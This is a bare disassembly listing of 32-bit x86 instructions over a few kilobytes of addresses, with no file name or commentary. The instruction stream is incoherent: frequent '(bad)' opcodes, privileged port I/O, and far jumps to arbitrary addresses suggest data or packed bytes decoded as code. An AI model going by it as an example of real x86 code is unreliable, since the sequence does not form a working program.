  40e9cf:	adc    al,0xd2
  40e9d1:	shr    BYTE PTR [ebx+ebp*4-0x7ac83ed],0xd8
  40e9d9:	std    
  40e9da:	or     ecx,DWORD PTR ss:[esi+0x5dcb35e]
  40e9e1:	or     eax,0x499d8226
  40e9e6:	dec    ecx
  40e9e7:	and    BYTE PTR [eax+0x6f],al
  40e9ea:	jmp    0xc1d3:0x78a1e28f
  40e9f1:	(bad)  
  40e9f2:	mov    eax,0x21b67e5b
  40e9f7:	mov    cl,0xff
  40e9f9:	pop    cx
  40e9fb:	jp     0x40e9e0
  40e9fd:	hlt    
  40e9fe:	mov    ebx,ds
  40ea00:	push   edx
  40ea01:	lock sub al,0x6e
  40ea04:	cli    
  40ea05:	dec    ebp
  40ea06:	sahf   
  40ea07:	mov    bh,0x2
  40ea09:	xor    al,0x60
  40ea0b:	add    dl,BYTE PTR [ecx+0xa5960dd]
  40ea11:	arpl   bp,sp
  40ea13:	or     DWORD PTR [eax],0x7c245f87
  40ea19:	or     al,0xe9
  40ea1b:	jmp    0x40ea69
  40ea1d:	out    dx,eax
  40ea1e:	shr    DWORD PTR [esi+eiz*8],cl
  40ea21:	lds    edx,FWORD PTR [esi+0x39]
  40ea24:	repnz pop ds
  40ea26:	or     eax,0x6397adbd
  40ea2b:	cld    
  40ea2c:	inc    edx
  40ea2d:	(bad)  
  40ea2e:	out    dx,al
  40ea2f:	inc    eax
  40ea30:	or     esi,DWORD PTR [ebx-0x1a]
  40ea33:	es in  eax,dx
  40ea35:	iret   
  40ea36:	cmp    BYTE PTR [esi+0x4d63016d],bl
  40ea3c:	push   cs
  40ea3d:	rcr    dh,0x4f
  40ea40:	mov    ch,0x95
  40ea42:	and    eax,0xcbd0b7e5
  40ea47:	add    ecx,DWORD PTR [eax-0x42b14c81]
  40ea4d:	aaa    
  40ea4e:	call   0x4fdd7af1
  40ea53:	and    esi,DWORD PTR [esi+ebp*4-0x46]
  40ea57:	or     eax,0xc12bb9ba
  40ea5c:	std    
  40ea5d:	sahf   
  40ea5e:	sti    
  40ea5f:	loopne 0x40ea8b
  40ea61:	gs (bad) 
  40ea63:	xchg   edx,eax
  40ea64:	mov    ebx,0x6f6f3a4f
  40ea69:	jmp    0x2f65842b
  40ea6e:	dec    DWORD PTR [ebx+0x1237bcb6]
  40ea74:	(bad)  
  40ea75:	xor    al,0x1b
  40ea77:	xchg   ebp,eax
  40ea78:	pusha  
  40ea79:	rcl    BYTE PTR [ecx+0x3b376c94],0xaa
  40ea80:	inc    eax
  40ea81:	lods   al,BYTE PTR ds:[esi]
  40ea82:	out    0xfb,eax
  40ea84:	rol    DWORD PTR [edi],1
  40ea86:	inc    ebp
  40ea87:	pop    ebp
  40ea88:	cdq    
  40ea89:	arpl   WORD PTR [ecx+eax*4+0x3c31fd74],bx
  40ea90:	sbb    DWORD PTR [edx-0x7d],ebp
  40ea93:	cmp    dl,bl
  40ea95:	out    dx,eax
  40ea96:	loop   0x40ea2c
  40ea98:	pop    eax
  40ea99:	pop    edx
  40ea9a:	jmp    0x40eabb
  40ea9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea9d:	mov    esi,0xecb1bbc
  40eaa2:	int    0x2c
  40eaa4:	ss xchg ebp,eax
  40eaa6:	std    
  40eaa7:	pop    esi
  40eaa8:	xor    ah,0x3b
  40eaab:	push   0xef8a3404
  40eab0:	inc    ebx
  40eab1:	inc    ecx
  40eab2:	in     al,0x98
  40eab4:	lods   eax,DWORD PTR ds:[esi]
  40eab5:	nop
  40eab6:	enter  0x2fa4,0xd6
  40eaba:	dec    edx
  40eabb:	int    0xe5
  40eabd:	inc    edx
  40eabe:	xor    eax,0x1262d637
  40eac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eac4:	jne    0x40eb38
  40eac6:	xchg   edi,eax
  40eac7:	cmp    BYTE PTR [ebx],dl
  40eac9:	fs retf 
  40eacb:	sbb    BYTE PTR [ebp-0x3914188d],dh
  40ead1:	mov    dh,0x5f
  40ead3:	lock cwde 
  40ead5:	cmc    
  40ead6:	jge    0x40eac0
  40ead8:	mov    ecx,0x3db522ec
  40eadd:	push   esp
  40eade:	xchg   ecx,eax
  40eadf:	les    edx,FWORD PTR [ebx-0x304e69cd]
  40eae5:	imul   ebp,DWORD PTR [edx+0xd062e55],0x71d95418
  40eaef:	aaa    
  40eaf0:	pop    ecx
  40eaf1:	call   0x2f6d:0x233137f9
  40eaf8:	cmp    DWORD PTR [edi-0x6f],esp
  40eafb:	mov    WORD PTR [ecx+edi*8+0x3c2f8ee7],?
  40eb02:	sub    ah,cl
  40eb04:	ret    
  40eb05:	loop   0x40eaee
  40eb07:	mov    edi,ecx
  40eb09:	inc    esi
  40eb0a:	pop    ecx
  40eb0b:	pop    ds
  40eb0c:	aaa    
  40eb0d:	xchg   ah,cl
  40eb0f:	cld    
  40eb10:	push   ds
  40eb11:	fld    QWORD PTR [ecx+ebp*8+0x4528d753]
  40eb18:	ret    0xb7ac
  40eb1b:	dec    esp
  40eb1c:	lds    edi,FWORD PTR fs:[edi]
  40eb1f:	enter  0xe52e,0xfd
  40eb23:	cmp    ah,BYTE PTR [edi]
  40eb25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb26:	ret    
  40eb27:	test   DWORD PTR [ebp+0x2c],0x8722e6d1
  40eb2e:	in     al,dx
  40eb2f:	lods   eax,DWORD PTR ds:[esi]
  40eb30:	xchg   esi,eax
  40eb31:	scas   al,BYTE PTR es:[edi]
  40eb32:	retf   
  40eb33:	test   DWORD PTR [edx],edx
  40eb35:	mov    BYTE PTR gs:[ebp+0x7cbc017a],ch
  40eb3c:	jle    0x40eae9
  40eb3e:	scas   al,BYTE PTR es:[edi]
  40eb3f:	lahf   
  40eb40:	push   edi
  40eb41:	in     al,0xf0
  40eb43:	icebp  
  40eb44:	mov    ecx,0x6f742a54
  40eb49:	cld    
  40eb4a:	lock sub edx,edi
  40eb4d:	and    ebx,edi
  40eb4f:	fimul  WORD PTR [eax]
  40eb51:	dec    ch
  40eb53:	mov    bh,0xdd
  40eb55:	and    esp,ecx
  40eb57:	sbb    eax,0x2f5fe393
  40eb5c:	sub    BYTE PTR [esi-0x61],dl
  40eb5f:	mov    ebx,0x78daea6b
  40eb64:	mov    ds:0xdbf604a8,al
  40eb69:	mov    WORD PTR [eax],?
  40eb6b:	sar    DWORD PTR [edi+0x3a1d9472],1
  40eb71:	test   eax,0x79687c25
  40eb76:	cmp    DWORD PTR [ebx],eax
  40eb78:	adc    edi,edx
  40eb7a:	jb     0x40eb5c
  40eb7c:	jmp    0x820a6107
  40eb81:	and    DWORD PTR [ebp-0x54a55d7e],eax
  40eb87:	sbb    ebp,DWORD PTR [ecx]
  40eb89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb8a:	(bad)  
  40eb8c:	pop    ebp
  40eb8d:	jecxz  0x40eb27
  40eb8f:	pop    eax
  40eb90:	(bad)  
  40eb92:	pop    edx
  40eb93:	inc    ebp
  40eb94:	lea    edi,[edx-0x4f]
  40eb97:	pop    esp
  40eb98:	sub    al,0x8a
  40eb9a:	jg     0x40eb93
  40eb9c:	inc    ebx
  40eb9d:	inc    edx
  40eb9e:	pop    ebp
  40eb9f:	(bad)  
  40eba0:	xor    ebp,DWORD PTR [ebx]
  40eba2:	hlt    
  40eba3:	mov    eax,0xba11a19d
  40eba8:	adc    cl,al
  40ebaa:	leave  
  40ebab:	rcr    BYTE PTR [eax],1
  40ebad:	imul   DWORD PTR [ebx+0x4308f20f]
  40ebb3:	leave  
  40ebb4:	push   eax
  40ebb5:	je     0x40ebcb
  40ebb7:	leave  
  40ebb8:	adc    BYTE PTR [eax+ebp*4+0x7bcb8d78],0xfd
  40ebc0:	push   ebx
  40ebc1:	sar    DWORD PTR [ebx],0xc4
  40ebc4:	mov    bh,0x7f
  40ebc6:	imul   esi,edx,0xffffffd5
  40ebc9:	fisub  WORD PTR [edx]
  40ebcb:	gs mov ebx,0xdc20f494
  40ebd1:	daa    
  40ebd2:	add    DWORD PTR [edx],0xfffffff1
  40ebd5:	outs   dx,DWORD PTR ds:[esi]
  40ebd6:	cdq    
  40ebd7:	rcl    DWORD PTR [eax+0x7a89194c],cl
  40ebdd:	and    edx,esi
  40ebdf:	test   eax,0xca34b833
  40ebe4:	out    0x5f,eax
  40ebe6:	xchg   ecx,eax
  40ebe7:	mov    ds,WORD PTR [ebx+0x45767ecb]
  40ebed:	or     al,0x15
  40ebef:	mov    eax,ds:0x998d344d
  40ebf4:	fst    DWORD PTR [edx]
  40ebf6:	cmp    bl,ch
  40ebf8:	aas    
  40ebf9:	stc    
  40ebfa:	es jbe 0x40ec02
  40ebfd:	adc    eax,0x30b01822
  40ec02:	sbb    DWORD PTR [ebx-0x6978040a],edi
  40ec08:	xor    al,0xa4
  40ec0a:	dec    esp
  40ec0b:	or     ebp,DWORD PTR [ecx]
  40ec0d:	dec    esp
  40ec0e:	push   0x28
  40ec10:	arpl   sp,bp
  40ec12:	aam    0xad
  40ec14:	jmp    0xa72b:0x6d89862d
  40ec1b:	call   0xeac4:0xad170eee
  40ec22:	dec    esi
  40ec23:	sti    
  40ec24:	popf   
  40ec25:	(bad)  
  40ec26:	mov    al,ds:0x4b54b7e0
  40ec2b:	das    
  40ec2c:	cli    
  40ec2d:	jg     0x40ebf9
  40ec2f:	mov    bl,0xcc
  40ec31:	push   edi
  40ec32:	call   0xb109:0xfb9fa986
  40ec39:	xchg   ecx,eax
  40ec3a:	or     al,0x19
  40ec3c:	pop    edx
  40ec3d:	lea    ecx,[ebx-0x8]
  40ec40:	or     DWORD PTR [ecx],0xd98ec484
  40ec46:	or     BYTE PTR [ebx+0x1a8caefc],cl
  40ec4c:	pop    ebp
  40ec4d:	mov    ds:0xfc6a6923,eax
  40ec52:	call   0x3badf371
  40ec57:	fnstsw WORD PTR [esp+edi*2-0x5270dcc0]
  40ec5e:	mov    edi,edx
  40ec60:	call   FWORD PTR [esi+0x16]
  40ec63:	adc    bl,BYTE PTR [edx-0x4f93c207]
  40ec69:	arpl   WORD PTR [esi],si
  40ec6b:	iret   
  40ec6c:	test   al,0x7d
  40ec6e:	xlat   BYTE PTR ds:[ebx]
  40ec6f:	pop    eax
  40ec70:	loop   0x40ec3d
  40ec72:	pop    ebp
  40ec73:	out    0x4f,eax
  40ec75:	std    
  40ec76:	stos   BYTE PTR es:[edi],al
  40ec77:	(bad)  
  40ec78:	jmp    0x40ec24
  40ec7a:	mov    al,BYTE PTR [eax-0x546d06a9]
  40ec80:	xchg   BYTE PTR [ebx+0x61a6362],bl
  40ec86:	outs   dx,DWORD PTR ds:[esi]
  40ec87:	mov    edx,0x79baf1ce
  40ec8c:	mov    dh,0x60
  40ec8e:	test   BYTE PTR [ebx],ah
  40ec90:	(bad)
  40ec93:	punpckhdq mm4,QWORD PTR [edx-0x8e11ebf]
  40ec9a:	jne    0x40ecea
  40ec9c:	popf   
  40ec9d:	push   es
  40ec9e:	and    dh,BYTE PTR [edx]
  40eca0:	data16 test al,0x6c
  40eca3:	ins    DWORD PTR es:[edi],dx
  40eca4:	xor    al,0xca
  40eca6:	cs in  al,dx
  40eca8:	xor    dl,0xe0
  40ecab:	bound  ecx,QWORD PTR [ebp+eax*8-0x24]
  40ecaf:	xor    eax,DWORD PTR [edx+ebp*4-0x5a]
  40ecb3:	imul   ebx,eax,0x3c1eedc1
  40ecb9:	add    dh,dh
  40ecbb:	sub    BYTE PTR [eax+0x10],al
  40ecbe:	mov    bl,0xb2
  40ecc0:	cld    
  40ecc1:	xor    ebx,ebx
  40ecc3:	push   cs
  40ecc4:	repnz pop es
  40ecc6:	adc    DWORD PTR [eax],esp
  40ecc8:	outs   dx,DWORD PTR ds:[esi]
  40ecc9:	icebp  
  40ecca:	ins    DWORD PTR es:[edi],dx
  40eccb:	mov    bh,0x75
  40eccd:	je     0x40ed25
  40eccf:	push   ebp
  40ecd0:	stos   BYTE PTR es:[edi],al
  40ecd1:	mov    eax,0xebd11d15
  40ecd6:	pop    eax
  40ecd7:	mov    ebp,0xf7eeb5e5
  40ecdc:	pop    ecx
  40ecdd:	pop    ebx
  40ecde:	shl    BYTE PTR [ebx-0x3a85f9ae],1
  40ece4:	dec    ebx
  40ece5:	mov    ch,0x7b
  40ece7:	sbb    esp,DWORD PTR [ecx+ecx*2-0x5f3a323c]
  40ecee:	pop    edx
  40ecef:	dec    esp
  40ecf0:	ins    DWORD PTR es:[edi],dx
  40ecf1:	daa    
  40ecf2:	(bad)  
  40ecf3:	pop    ecx
  40ecf4:	repz dec edi
  40ecf6:	xor    BYTE PTR [ebx-0x49],dl
  40ecf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecfa:	rcr    BYTE PTR [ebx],cl
  40ecfc:	add    cl,BYTE PTR [edx+0x49]
  40ecff:	pop    ebx
  40ed00:	imul   edx,DWORD PTR [esi-0x11],0xffffffe1
  40ed04:	aas    
  40ed05:	test   al,0x23
  40ed07:	ja     0x40ecb7
  40ed09:	mov    al,0x38
  40ed0b:	repz mov ds:0x2a45ce7b,al
  40ed11:	int    0x76
  40ed13:	sbb    ebp,esi
  40ed15:	sbb    eax,0xdc3dd597
  40ed1a:	dec    edx
  40ed1b:	jmp    FWORD PTR [edi+0x42]
  40ed1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed1f:	cld    
  40ed20:	call   0x69956141
  40ed25:	fsubr  DWORD PTR [ecx+0x7c951557]
  40ed2b:	and    BYTE PTR [edx+0x49e3bed5],al
  40ed31:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40ed33:	mov    eax,ds:0xa556d92
  40ed38:	pushf  
  40ed39:	jmp    0x40ed58
  40ed3b:	pop    es
  40ed3c:	scas   eax,DWORD PTR es:[edi]
  40ed3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed3e:	mov    al,ds:0xa452a27d
  40ed43:	call   0xb715f1f
  40ed48:	int3   
  40ed49:	scas   al,BYTE PTR es:[edi]
  40ed4a:	dec    esi
  40ed4b:	ja     0x40ed80
  40ed4d:	js     0x40edbc
  40ed4f:	out    0xa1,al
  40ed51:	cs pop edi
  40ed53:	adc    eax,0x526512a6
  40ed58:	pop    ebx
  40ed59:	xchg   BYTE PTR [edx+0x7c],bl
  40ed5c:	mov    ebp,0x59ba939a
  40ed61:	mov    edi,0x3224bc74
  40ed66:	push   es
  40ed67:	sub    edi,DWORD PTR ds:0xf0343b8b
  40ed6d:	out    0x45,eax
  40ed6f:	dec    edi
  40ed70:	cli    
  40ed71:	js     0x40edaf
  40ed73:	sbb    esi,DWORD PTR [edx]
  40ed75:	xor    DWORD PTR [esi],ecx
  40ed77:	jno    0x40ede1
  40ed79:	daa    
  40ed7a:	es push es
  40ed7c:	icebp  
  40ed7d:	cmp    BYTE PTR [eax+0x6f],al
  40ed80:	cmp    BYTE PTR [ebx+0x55],dh
  40ed83:	mov    bh,BYTE PTR [esi+0x68]
  40ed86:	mov    eax,ss
  40ed88:	fwait
  40ed89:	lods   al,BYTE PTR ds:[esi]
  40ed8a:	push   es
  40ed8b:	adc    eax,0xf7785243
  40ed90:	not    BYTE PTR [eax+0x3f]
  40ed93:	arpl   ax,bp
  40ed95:	scas   al,BYTE PTR es:[edi]
  40ed96:	jg     0x40ed96
  40ed98:	add    eax,0x6935734f
  40ed9d:	gs and ebx,0xffffffdc
  40eda1:	fldenv [ebp-0x70a81f99]
  40eda7:	push   eax
  40eda8:	loope  0x40ed84
  40edaa:	cmp    al,0xab
  40edac:	(bad)  
  40edad:	mov    ah,0x3a
  40edaf:	pop    edx
  40edb0:	fcmovb st,st(3)
  40edb2:	aaa    
  40edb3:	mov    ecx,ss
  40edb5:	dec    esi
  40edb6:	sub    eax,edx
  40edb8:	xor    al,0xfc
  40edba:	pop    ecx
  40edbb:	xchg   ecx,eax
  40edbc:	das    
  40edbd:	clc    
  40edbe:	add    eax,0x83f32d2f
  40edc3:	popa   
  40edc4:	mov    dh,0x87
  40edc6:	imul   eax,DWORD PTR [edi-0x43],0x15d5b454
  40edcd:	hlt    
  40edce:	or     cl,BYTE PTR [edx+0x5ceade7c]
  40edd4:	jp     0x40eda0
  40edd6:	mov    ecx,0xe803fde2
  40eddb:	mov    esp,0x95faab08
  40ede0:	dec    ebp
  40ede1:	push   edi
  40ede2:	mov    ecx,0x6b91e36c
  40ede7:	xchg   ah,al
  40ede9:	adc    BYTE PTR [edx-0x6c],0x48
  40eded:	call   0xc91db141
  40edf2:	arpl   WORD PTR [edx-0x186e970e],si
  40edf8:	sub    eax,0xa78549af
  40edfd:	inc    esi
  40edfe:	aaa    
  40edff:	sbb    al,0xd3
  40ee01:	ds xor ebp,ecx
  40ee04:	add    BYTE PTR [edi-0x4de39dd2],dh
  40ee0a:	popf   
  40ee0b:	pop    esp
  40ee0c:	jmp    0xcf5d9795
  40ee11:	retf   
  40ee12:	(bad)  
  40ee13:	fisttp WORD PTR [ebx]
  40ee15:	and    DWORD PTR [ebx+0x1c],esi
  40ee18:	mov    esp,0x37a83564
  40ee1d:	jbe    0x40ee23
  40ee1f:	into   
  40ee20:	xor    DWORD PTR [ebx+0x5a],ebx
  40ee23:	retf   0x7e3
  40ee26:	push   es
  40ee27:	call   0x26ad8942
  40ee2c:	loope  0x40ee6d
  40ee2e:	jbe    0x40edc9
  40ee30:	sbb    bl,cl
  40ee32:	mov    bh,0xd6
  40ee34:	push   esp
  40ee35:	in     eax,dx
  40ee36:	and    BYTE PTR ds:0xd464be2d,dh
  40ee3c:	sub    DWORD PTR [edi-0x1f],ebp
  40ee3f:	cmc    
  40ee40:	not    BYTE PTR [esi]
  40ee42:	call   0x63fcff4f
  40ee47:	pop    ds
  40ee48:	lods   al,BYTE PTR ds:[esi]
  40ee49:	cmc    
  40ee4a:	xchg   BYTE PTR [edx],dl
  40ee4c:	pop    esi
  40ee4d:	imul   ecx,ebx,0xffffffda
  40ee50:	shl    DWORD PTR [ecx],cl
  40ee52:	mov    esp,0xe76d38fb
  40ee57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee58:	mov    DWORD PTR [ebx],ebp
  40ee5a:	fsubr  QWORD PTR [edx-0x589a6e8c]
  40ee60:	push   ss
  40ee61:	rcl    BYTE PTR [edx*8-0x12b0e199],cl
  40ee68:	xor    ebp,DWORD PTR [ecx-0x24]
  40ee6b:	or     ah,bh
  40ee6d:	aaa    
  40ee6e:	add    al,0xe6
  40ee71:	jb     0x40ee3e
  40ee73:	into   
  40ee74:	loop   0x40eee6
  40ee76:	dec    edx
  40ee77:	mov    ecx,0xabee14e8
  40ee7c:	in     al,dx
  40ee7d:	test   DWORD PTR [ebx],edx
  40ee7f:	xchg   edx,eax
  40ee80:	sub    al,0x9
  40ee82:	test   DWORD PTR [eax-0x76373708],esi
  40ee88:	push   eax
  40ee89:	out    dx,al
  40ee8a:	adc    cl,BYTE PTR [ebp+0x63f3a660]
  40ee90:	mov    al,dl
  40ee92:	mov    esi,0x61e3d032
  40ee97:	push   0xfbf682cf
  40ee9c:	cld    
  40ee9d:	repz sbb DWORD PTR [edx-0x24e458cf],0xffffff86
  40eea5:	test   DWORD PTR [edx+edi*8-0x6c74d6c0],esp
  40eeac:	pushf  
  40eead:	mov    eax,ds:0x2f9da2a3
  40eeb2:	xchg   ebp,eax
  40eeb3:	lahf   
  40eeb4:	or     DWORD PTR [ecx+0x5d63bdcb],ecx
  40eeba:	sbb    al,0x51
  40eebc:	mov    ah,0x44
  40eebe:	clc    
  40eebf:	xor    ah,BYTE PTR [edx]
  40eec1:	shl    BYTE PTR [esi+0x2c0f427b],0x49
  40eec8:	and    esi,ebp
  40eeca:	jmp    0xb0e77ba6
  40eecf:	xor    dl,BYTE PTR [eax-0x37]
  40eed2:	xchg   BYTE PTR [esi+0xe589b9b],bh
  40eed8:	test   eax,0x3bd894be
  40eedd:	add    dh,bl
  40eedf:	retf   0xa8cd
  40eee2:	xchg   ebp,eax
  40eee3:	aas    
  40eee4:	cdq    
  40eee5:	sbb    bh,bl
  40eee7:	test   DWORD PTR [ebx-0x78b4e0a1],esi
  40eeed:	jmp    0x40ee77
  40eeef:	shl    DWORD PTR [edi-0x4dc32419],1
  40eef5:	test   esp,edi
  40eef7:	int3   
  40eef8:	data16 adc dl,0x41
  40eefc:	add    bl,BYTE PTR [eax]
  40eefe:	arpl   WORD PTR [edi+0x4f3606d8],dx
  40ef04:	add    BYTE PTR [eax+0x20ba2ca3],bl
  40ef0a:	jge    0x40ef07
  40ef0c:	push   es
  40ef0d:	sub    BYTE PTR [edx],ch
  40ef0f:	mov    eax,ds:0xf33d53a2
  40ef14:	jg     0x40eee4
  40ef16:	push   0xffffffae
  40ef18:	pop    edi
  40ef19:	or     al,0x62
  40ef1b:	pop    ebx
  40ef1c:	xor    dl,BYTE PTR [edi+0x56]
  40ef1f:	and    BYTE PTR [ebx+0x39],al
  40ef22:	in     eax,dx
  40ef23:	stos   DWORD PTR es:[edi],eax
  40ef24:	pop    esi
  40ef25:	push   eax
  40ef26:	jbe    0x40eeb9
  40ef28:	stc    
  40ef29:	and    ch,BYTE PTR [ebx+ebp*1-0x51987c86]
  40ef30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef31:	cmp    BYTE PTR [edx+0x33c1d721],ah
  40ef37:	add    BYTE PTR [ecx+0x55be97ef],ch
  40ef3d:	jg     0x40eef3
  40ef3f:	jnp    0x40eeef
  40ef41:	gs daa 
  40ef43:	xor    BYTE PTR [esp+ebp*4-0x59df2798],bl
  40ef4a:	pop    esp
  40ef4b:	fsub   st(3),st
  40ef4d:	mov    al,ds:0x8ddb9c9f
  40ef52:	push   0x49
  40ef54:	xchg   esp,eax
  40ef55:	mov    ebp,0x5fd613a8
  40ef5a:	dec    edi
  40ef5b:	push   0xfa83d24d
  40ef60:	push   edx
  40ef61:	jnp    0x40ef62
  40ef63:	sahf   
  40ef64:	int3   
  40ef65:	add    dl,BYTE PTR [edi+0x3300edff]
  40ef6b:	jbe    0x40efd4
  40ef6d:	xlat   BYTE PTR ds:[ebx]
  40ef6e:	nop    edx
  40ef71:	dec    esi
  40ef72:	push   ds
  40ef73:	sbb    eax,0x8952e6a8
  40ef78:	push   0x29f57312
  40ef7d:	leave  
  40ef7e:	pop    ebx
  40ef7f:	retf   
  40ef80:	adc    ebx,DWORD PTR [esi-0x4f1c10c3]
  40ef86:	outs   dx,BYTE PTR ds:[esi]
  40ef87:	and    al,0x2f
  40ef89:	cdq    
  40ef8a:	adc    BYTE PTR [ecx+0x7b37f983],0x22
  40ef91:	or     al,0x80
  40ef93:	sti    
  40ef94:	lods   al,BYTE PTR ds:[esi]
  40ef95:	or     al,0x73
  40ef97:	repz push ebx
  40ef99:	xor    ebx,DWORD PTR [ebp+0x579b150e]
  40ef9f:	sbb    al,0x9
  40efa1:	xchg   edi,eax
  40efa2:	pop    edx
  40efa3:	cmp    al,0x29
  40efa5:	inc    esp
  40efa6:	xor    eax,0x50e3fbda
  40efab:	popf   
  40efac:	out    dx,al
  40efad:	and    BYTE PTR [esi+ebp*4],bl
  40efb0:	test   BYTE PTR [edi-0x6bfe2a51],0xa0
  40efb7:	pop    ecx
  40efb8:	jnp    0x40efa8
  40efba:	inc    eax
  40efbb:	jno    0x40efb5
  40efbd:	div    BYTE PTR [bx+si+0x92e]
  40efc2:	clc    
  40efc3:	das    
  40efc4:	xor    DWORD PTR ds:[edx-0x133c829],eax
  40efcb:	mov    al,0xb0
  40efcd:	lock sub eax,0x392979ce
  40efd3:	js     0x40efe1
  40efd5:	jb     0x40efd3
  40efd7:	ret    
  40efd8:	(bad)  
  40efd9:	leave  
  40efda:	add    DWORD PTR [esi],esp
  40efdc:	fsubp  st(1),st
  40efde:	add    BYTE PTR [edi],ah
  40efe0:	mov    edi,0xf2be9478
  40efe5:	dec    esi
  40efe6:	lahf   
  40efe7:	(bad)  
  40efe8:	aad    0xcd
  40efea:	push   ds
  40efeb:	loopne 0x40efe6
  40efed:	jp     0x40efe4
  40efef:	push   eax
  40eff0:	xchg   ebx,eax
  40eff1:	jge    0x40f043
  40eff3:	js     0x40f01f
  40eff5:	lds    edx,FWORD PTR [ecx-0x5211077f]
  40effb:	dec    ebx
  40effc:	cmp    dl,BYTE PTR [edx-0x61ed96ed]
  40f002:	xchg   esi,eax
  40f003:	test   eax,0x11cec927
  40f008:	inc    eax
  40f009:	pop    edx
  40f00a:	ror    BYTE PTR [edi+ebp*1+0x78],0xe0
  40f00f:	add    DWORD PTR [edx+0x31b56f3c],edi
  40f015:	ins    DWORD PTR es:[edi],dx
  40f016:	(bad)  
  40f017:	mov    bl,0x96
  40f019:	cmp    eax,DWORD PTR [esp+edx*4]
  40f01c:	adc    al,BYTE PTR [eax]
  40f01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f01f:	(bad)  
  40f021:	sub    BYTE PTR [ebx+ebp*2-0x47817885],bh
  40f028:	xor    bh,bh
  40f02a:	mov    ah,0xbd
  40f02c:	(bad)  
  40f02d:	cmp    BYTE PTR [ebx],dh
  40f02f:	call   0xe94f3c69
  40f034:	shl    DWORD PTR [ecx+ecx*2],0xce
  40f038:	xchg   edx,eax
  40f039:	cmp    ch,al
  40f03b:	mov    ah,0xb2
  40f03d:	push   edx
  40f03e:	(bad)  
  40f03f:	mov    ds:0x4ac607f1,eax
  40f044:	aaa    
  40f045:	or     DWORD PTR ds:0xda02011e,0xffffffed
  40f04c:	mov    eax,ds:0x6f33880f
  40f051:	add    esi,edx
  40f053:	shl    edx,1
  40f055:	scas   eax,DWORD PTR es:[edi]
  40f056:	jne    0x40f0a4
  40f058:	xchg   esi,eax
  40f059:	inc    edi
  40f05a:	je     0x40f035
  40f05c:	pop    ds
  40f05d:	scas   eax,DWORD PTR es:[edi]
  40f05e:	pop    ebx
  40f05f:	mov    edx,0xc4c37bc3
  40f064:	push   ss
  40f065:	fsubr  QWORD PTR ds:0x7967bd00
  40f06b:	xchg   edi,eax
  40f06c:	ins    DWORD PTR es:[edi],dx
  40f06d:	mov    bl,0x0
  40f06f:	ins    BYTE PTR es:[edi],dx
  40f070:	mov    BYTE PTR [ecx],ch
  40f072:	ror    BYTE PTR [ecx],cl
  40f074:	cmp    al,0x15
  40f076:	dec    edi
  40f077:	and    edi,ebx
  40f079:	call   0x572b1361
  40f07e:	cmp    esp,0x69e9a46c
  40f084:	loopne 0x40f071
  40f086:	clc    
  40f087:	call   0x6dd6:0xc96c6686
  40f08e:	sbb    esi,eax
  40f090:	sub    dl,BYTE PTR [ebx+0x76]
  40f093:	sbb    DWORD PTR [edi-0x1662f90f],ebp
  40f099:	(bad)  
  40f09a:	fidiv  WORD PTR [esi+0x2fa3549e]
  40f0a0:	jbe    0x40f062
  40f0a2:	adc    eax,0x8e3c5e33
  40f0a7:	adc    bl,BYTE PTR [edx+0x6a3fb35d]
  40f0ad:	icebp  
  40f0ae:	ror    ch,0x38
  40f0b1:	ret    0x8633
  40f0b4:	stc    
  40f0b5:	stc    
  40f0b6:	pop    eax
  40f0b7:	mov    DWORD PTR ds:0xbf36d3df,edi
  40f0bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0be:	jmp    0xe7d50dca
  40f0c3:	rcl    BYTE PTR [ebp+0x63],cl
  40f0c6:	(bad)  
  40f0c8:	sbb    al,dh
  40f0ca:	ins    DWORD PTR es:[edi],dx
  40f0cb:	inc    esi
  40f0cc:	rol    DWORD PTR es:[ebx-0x2bd3453c],1
  40f0d3:	mov    al,ds:0x318fb07d
  40f0d8:	aam    0xa9
  40f0da:	mov    al,BYTE PTR [esp+edx*2]
  40f0dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0de:	fnstsw WORD PTR [esi-0x4a]
  40f0e1:	aad    0xe9
  40f0e3:	xor    esi,DWORD PTR [ebx*4+0x41dfb0e7]
  40f0ea:	sub    al,0xc4
  40f0ec:	std    
  40f0ed:	xchg   esp,eax
  40f0ee:	mov    bh,0x84
  40f0f0:	pop    ss
  40f0f1:	xor    esp,DWORD PTR [esi-0x3a]
  40f0f4:	pop    edx
  40f0f5:	jge    0x40f13c
  40f0f7:	retf   
  40f0f8:	and    ebp,ecx
  40f0fa:	cmp    DWORD PTR [esp+ecx*4-0x77c5e071],esp
  40f101:	jno    0x40f121
  40f103:	bound  edx,QWORD PTR [ecx+0x2cd33f87]
  40f109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10a:	push   cs
  40f10b:	inc    edi
  40f10c:	ret    0x5a36
  40f10f:	data16 (bad) 
  40f111:	in     eax,0x15
  40f113:	lods   al,BYTE PTR ds:[esi]
  40f114:	fstp   DWORD PTR [ebp+0x51]
  40f117:	aaa    
  40f118:	fidiv  DWORD PTR [edx+0x64856a3e]
  40f11e:	jns    0x40f153
  40f120:	popa   
  40f121:	outs   dx,BYTE PTR ds:[esi]
  40f122:	lods   al,BYTE PTR ds:[esi]
  40f123:	jp     0x40f12b
  40f125:	jecxz  0x40f0fa
  40f127:	cli    
  40f128:	jnp    0x40f0d2
  40f12a:	repnz inc esp
  40f12c:	jmp    0xfb6f:0x7512d3e8
  40f133:	stc    
  40f134:	stc    
  40f135:	fidiv  WORD PTR [eax]
  40f137:	add    eax,0x6b2b36c3
  40f13c:	or     esi,DWORD PTR [edi+0x67]
  40f13f:	es cmp edi,0x2a72ccaa
  40f146:	daa    
  40f147:	pop    ds
  40f148:	shl    DWORD PTR ds:0x31c3e6d7,cl
  40f14e:	jp     0x40f0fe
  40f150:	inc    ecx
  40f151:	ds out 0x44,eax
